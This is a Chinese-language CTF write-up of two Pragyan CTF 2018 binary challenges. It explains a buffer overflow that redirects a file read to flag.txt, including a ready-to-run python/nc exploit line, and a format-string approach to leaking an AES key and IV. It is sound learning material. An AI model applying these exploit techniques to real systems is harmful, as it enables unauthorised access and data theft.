# Pragyan CTF 2018 - Notes

## Old school hack
> Description:
> 
> Chris is trying out to be a police officer and the applications have just been sent into the police academy. He is really eager to find out about his competition. Help it him back the system and view the other applicant’s applications.

> The service is running at 128.199.224.175:13000

一開始要輸入密碼，可以用 ltrace 看

或者用 ida pro 看，
```
 __isoc99_scanf("%s", &password);
  if ( strncmp(&password, "kaiokenx20", 10uLL) )
  {
    puts("Incorrect password. Closing connection.");
    exit(0);
  }
```

這裡可以造成 buffer overflow ，因為 strncmp 只讀後面提供的長度去比對

不過這題保護
```
[*] '/tmp/p/a'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

不過 ltrace 預設只會讀 32 byte ，所以可以用 ltrace 加長來看
```
$ ltrace -s 70 ./a
```

然後用 ida pro 可以看到，他會去比對只要長度符合 36 ，就會去讀檔案

那思路就是先用 buffer overflow 蓋到那個位置，改成 flag.txt 即可

那因為要求長度是 36 ，故需要利用 ././././ 這樣的方式增加長度

```
$ python -c 'print "kaiokenx20aaaaaa././././././././././././././flag.txt\n1000"' | nc 128.199.224.175 13000
```

## Unbreakable encryption
> Description:
>
> Your friend, Liara, has encrypted all her life secrets, using the one of the best encryptions available in the world, the AES. She has challenged you that no matter what, you can never read her life secrets.
> 
> The encryption service is running at :- 128.199.224.175:33000
> The binary file is named aes_enc.
> 
> Her encrypted life secrets are as follows :-
> 
```
0000 - 40 87 68 1a b0 23 73 c4 61 44 b4 c0 21 f1 63 0b @.h..#s.aD..!.c.
0010 - 73 e9 0d 38 e4 bd d8 33 41 64 2c 43 85 d4 54 0e s..8...3Ad,C..T.
0020 - f5 bc 8c 02 db ee 0d e8 d6 29 81 3a 5f cb 63 bd .........).:_.c.
```
> 
> 
> Note: Since some teams were having issues with the buffering of the I/O streams when executing the binary remotely, we have updated the binary file, to flush the output streams properly. The modified binary is named aes_enc_unbf, and will be running on 128.199.224.175:33100

[參考學習](https://ctftime.org/task/5475)
[詳細WRITE_UP](https://bbs.pediy.com/thread-224992.htm)

先用 ida pro 來看，一開始會先讓我們輸入
```
_isoc99_scanf("%s", input);
```

這裡有一個漏洞，因為 scanf() 用 %s ，沒限制長度，所以有 buffer overflow
(吃到 Null byte 才停止， input 大小是 127)


第二個漏洞在他最後印出我們的 message
```
puts("\nYour message is :- ");
printf(input);
```

這裡有 format string 的漏洞

然後在 encrypt() 中，他一開始會 Load aes_iv 和 aes_key

之後有一個 printf()

```
printf(ciphertext_msg);
```

這裡 ciphertext_msg 在 .data ，也就是說它的位置是固定的

看他位置可以
```
$ nm ./vul | grep ciphertext_msg
```

所以我們如果用第一個 format string vuln 去改這個 printf() 也可以造成 format string vuln

且在這個時候， iv 和 key 已經 load 到 stack 中了

所以整個思路是，一開始先利用第一個 format string vuln 來改 encrypt() 中的 printf()裡面的字串

來造成 format string vuln 來印出 iv 和 key ，之後拿來解密